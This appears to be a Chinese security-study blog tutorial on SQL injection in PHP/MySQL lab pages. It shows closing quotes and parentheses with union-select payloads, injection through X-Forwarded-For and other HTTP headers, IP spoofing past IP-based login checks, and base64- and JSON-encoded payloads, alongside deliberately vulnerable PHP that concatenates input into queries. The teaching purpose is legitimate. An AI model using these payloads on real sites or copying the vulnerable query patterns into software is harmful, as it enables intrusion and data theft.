---
title: PHP应用&SQL注入&符号拼接&请求方法&HTTP头&JSON&编码类
published: 2025-10-27
description: SQL注入的四种数据请求类型、请求方法注入、头部信息注入，base64和json格式注入。
tags: [PHP,WEB攻防,SQL注入]
category: 网络安全
draft: false
---

## 内容总结

> 1. 学习数据请求方法4种注入类型。$id 与 '$id' 的区别及应该如何注入。
>
> 2. Forwarded-For，Rerferer，Host，get，post ，cookie的使用，以及使用bp进行改包。
>
> 3. Forwarded-For锻造伪ip进行登录。
>
> 4. 情况一：数据库白名单IP去判断-select注入
>
>    情况二：代码配置固定IP去判断：
>
>    情况三：防注入IP去保存数据库：
>
> 5. 文件上传将文件名写入数据库。
> 6. 由于数据请求格式不同（base64和json），需要使用加密后的sql语句注入。

简单来说：

sql的写法不同，用到的方法不同。

## 知识点

> PHP-MYSQL-数据请求类型
>
> PHP-MYSQL-数据请求方法
>
> PHP-MYSQL-数据请求格式

## PHP—MYSQL—数据请求类型

> SQL语句由于在黑盒中是无法预知写法的，SQL注入能发成功是需要拼接原SQL语句，
>
> 大部分黑盒能做的就是分析后各种尝试去判断，所以有可能有注入但可能出现无法注入成功的情况。究其原因大部分都是原 SQL 语句的未知性导致的拼接失败！
>
> 由于开发者对于数据类型和 SQL 语句写法（框架写法）导致 SQL 注入拼接失败。

### 4种注入类型

1. 数字型(无符号干扰)

   ```sql
   select * from news where id=$id;
   ```

2. 字符型（有符号干扰）

   ```sql
   select * from news where id='$id';
   ```

3. 搜索型（有多符号干扰）

   ```sql
   select * from news where id like '%$id%'
   ```

4. 框架型（有各种符号干扰）

   ```sql
   select * from news where id=('$id');
   select * from news where (id='$id');
   ```

#### 解释实验

1. 数字型(无符号干扰)

   select * from news where id=$id;

   ![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4301.png)

2. 字符型（有符号干扰）

   select * from news where id='$id';

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4302.png)

代码中sql语句为`$sql="select * from news where id = '$id'";`

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4303.png)

**此时使用绕过，就需要进行闭合，使sql语句执行。**

```sq
http://localhost/new_demo/new.php?id=1' union select 1,2,3,4,5,6--+
```

有时候由于怕给的结果不是字符串从而查不到结果。所以会在查询出加上单引号。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4304.png)

之后就可以在其中写入一些注入，比如：查询系统版本，数据库名等等操作。

3. 搜索型（有多符号干扰）

   select * from news where id like '%$id%'

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4305.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4306.png)

**绕过方法：将`%`先过滤之后`'`闭合，后面增加注入语句再进行闭合。**

语句如下：

```sql
http://localhost/new_demo/new.php?id=1%' union select 1,2,3,database(),5,6--+
```

或者：

```sql
http://localhost/new_demo/new.php?id=1%' union select 1,2,3,database(),5,6 and '%'='
```

4. 框架型（有各种符号干扰）

select * from news where id=('$id');

select * from news where (id='$id');

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4307.png)

使用以下可以绕过：

```sql
http://localhost/new_demo/new.php?id=1') union select 1,2,3,database(),5,6--+
http://localhost/new_demo/new.php?id=1') union select 1,2,3,database(),5,6 and ('=
```

##### 总结

由于开发者对于数据类型和 SQL 语句写法（框架写法）导致 SQL 注入拼接失败。

只能用网上的工具去跑sql语句或者手工猜语句，也可以使用源码来进行。

## PHP—MYSQL—数据请求方法

全局变量方法：GET POST SERVER FILES HTTP头等。

User-Agent：

使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）。

Cookie：

网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）。

Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的。

Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号。

### GET/POST/Cookie/REQUEST都可以进行数据请求，发生注入

分别为Get、Post、Request：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4308.png)

Cookie请求：

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4309.png)

### 使用burpsuite实现post注入

使用bp抓包，并且使用order by来判断字段列数。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4310.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4311.png)

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4312.png)

这时可以拿到表字段列数，证明有3列。

之后使用联合查询得到数据库名及版本号之类的信息。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4313.png)

### Forwarded-For/Rerferer/Host间接查询注入

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/8f7c5500c9834d8bab77ae7023cd865d.png)

测试代码如下：

```php
<?php
**// 获取用户代理信息
$ua = $_SERVER['HTTP_USER_AGENT'];**
 
**// 获取 X-Forwarded-For 头部的值，表示客户端的原始 IP 地址
$xff = $_SERVER['HTTP_X_FORWARDED_FOR'];**
 
**// 获取 HTTP 请求头中的主机信息
$host = $_SERVER['HTTP_HOST'];**
 
**// 获取 HTTP 请求头中的 Referer 信息，表示请求的来源页面
$re = $_SERVER['HTTP_REFERER'];**
 
// 输出用户代理信息
echo $ua . "<br>";
// 输出 X-Forwarded-For 头部的值
echo $xff . "<br>";
// 输出主机信息
echo $host . "<br>";
// 输出 Referer 信息
echo $re . "<br>";
?>
```

> **`User-Agent`**：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）。
>
> **`Forwarded-For`**：简称XFF头，它代表客户端，也就是**HTTP的请求端真实的IP**,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件**[通过修改XXF头可以实现伪造IP]**）格式如：`X-Forwarded-for:sql语句`
>
> **`Rerferer`**：浏览器向 WEB 服务器表明自己是从**哪个页面链接过来的.**

### 登录判断IP

**登录判断IP时→是PHP特性中的$_SERVER[‘HTTP_X_FORWARDED_FOR’];接受IP的绕过（绕过）**

代码如下：

PHP 函数，旨在获取客户端的 IP 地址

```php
<?php
// 定义名为 getip 的函数
function getip() {
    // 检查是否存在 HTTP_CLIENT_IP，并且其值不是 "unknown"
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) {
        $ip = getenv("HTTP_CLIENT_IP");
    } 
    // 检查是否存在 HTTP_X_FORWARDED_FOR，并且其值不是 "unknown"
    **else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) {
        $ip = getenv("HTTP_X_FORWARDED_FOR");
    }** 
    // 检查是否存在 REMOTE_ADDR，并且其值不是 "unknown"
    else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) {
        $ip = getenv("REMOTE_ADDR");
    } 
    // 检查是否存在 $_SERVER['REMOTE_ADDR']，其值不为空，并且不是 "unknown"
    else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) {
        $ip = $_SERVER['REMOTE_ADDR'];
    } 
    // 如果上述条件都不满足，则将 IP 地址设置为 "unknown"
    else {
        $ip = "unknown";
    }
    
    // 返回获取到的 IP 地址
    return $ip;
}
?>
```

用于验证用户登录的部分，通过获取用户的 IP 地址，然后**根据 IP 地址从数据库中检索相应的用户信息**。

```php
<?php
// 调用之前定义的获取 IP 地址的函数
$ip = getip();
//echo $ip; // 如果需要调试可以打印出 IP 地址
 
// 判断是否设置了 $username 变量
if(isset($username)){
    // 判断用户的 IP 是否在数据库中，可能涉及到 IP 地址验证和拦截一些不合法请求的目的
    // 注意：这种方式仅是简单的示例，实际应用中需要更复杂的逻辑和安全措施
 
    **// 构造 SQL 查询语句，查询数据库中是否有对应 IP 地址的用户信息
    $sql = "SELECT * FROM admin WHERE ip='$ip'";**
    
    // 执行 SQL 查询
    $data = mysqli_query($con, $sql);
    
    // 判断查询结果是否存在符合条件的记录
    if(mysqli_num_rows($data) > 0){
        // 遍历查询结果集中的每一行
        while ($row = mysqli_fetch_row($data)) {
            echo "Username: " . $row[0] . "<br>";
            echo "Password: " . $row[1] . "<br>";
            echo "ID: " . $row[2];
        }
    } else {
        // 如果没有符合条件的记录，输出拒绝访问的提示
        echo "<script>alert('拒绝访问')</script>";
    }
}
?>
```

#### 三种情况

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/b7ad3f4538ba4f169694fecc884052e5.png)

##### 情况一：数据库白名单IP去判断-select注入

判断IP是不是在数据库中，引发xff注入 数据库ip存储导致的错误。

无论怎么访问都登陆不上，并回复拒绝访问。可能是ip限制访问。

 由于代码语句中有ip可以注入：

```sql
 $sql = "SELECT * FROM admin WHERE ip='$ip'"；
```

所以使用bp抓包伪造ip进行登录：

```sql
X-Forwarded-for:asdsad' union select 1,version(),database(),user()--+
X-Forwarded-for:asdsad' union select 1,version(),database(),user() and '1'='1
```

<img src="https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4314.png" style="zoom:80%;" />

##### 情况二：代码配置固定IP去判断

```php
$ip=getip();
//echo $ip;
if(isset($username)){
    // 判断IP是不是在数据库中 引发xff注入 数据库存储ip导致的注入
    // IP配置到代码中 那就不是产生注入了
    //$sql="select * from admin where ip='$ip'";
 
    // 绕过隐患 ip放在配置文件或代码声明中
    if($ip=='127.0.0.1'){
        echo "<script>alert('可以登录')</script>";
    }
    else{
        echo "<script>alert('拒绝访问')</script>";
    }
}
```

直接把请求头中的xff改为放行的ip即可。

##### 情况三：防注入IP去保存数据库

FILES：是如何进行注入的？

![img](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/b1f8c3c832044058b4bc97ca97c2021b.png)

## PHP—MYSQL—数据请求格式

数据采用统一格式传输，后端使用格式解析代入数据库（json）

```php
<?php
 
include './config.php';
$jsonData = file_get_contents('php://input');
// 将 JSON 数据解码为 PHP 数组
$data = json_decode($jsonData, true);
// 在此处处理登录逻辑
$username = $data['username'];
$password = $data['password'];
 
$sql="select * from admin where username='$username' and password='$password'";
$data=mysqli_query($con,$sql);
$rowcount=mysqli_num_rows($data);
while ($row=mysqli_fetch_row($data)) {
    echo "username".$row[0]."<br>";
    echo "password:".$row[1]."<br>";
    echo "ID".$row[2];
}
?>
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4517.png)

### 演示

用加密编码传输，后端进行解密解码代入数据库（base64）

可以观察url，使用解密软件发现MQ==实际上就是1。

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4315.png)

使用的逻辑是：**前端加密，后端解密。**

代码片段：

```php
$id=$_GET['id'] ?? 'MQ==';
$bid=base64_decode($id);
$sql="select * from news where id='$bid'";
$data=mysqli_query($con,$sql);
while ($row=mysqli_fetch_row($data)) {
    $page_title=$row['1'];
    $heading=$row['2'];
    $subheading=$row['3'];
    $content=$row['4'];
    $item=$row['5'];
    //echo $page_title;
}
```

先加密，之后把加密后的注入语句拼接到url当中：

```sql
3' union select 1,2,3,user(),database(),6 and '1'='1
经过base64编码加密后为：
MycgdW5pb24gc2VsZWN0IDEsMiwzLHVzZXIoKSxkYXRhYmFzZSgpLDYgYW5kICcxJz0nMQ==
```

![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/4516.png)
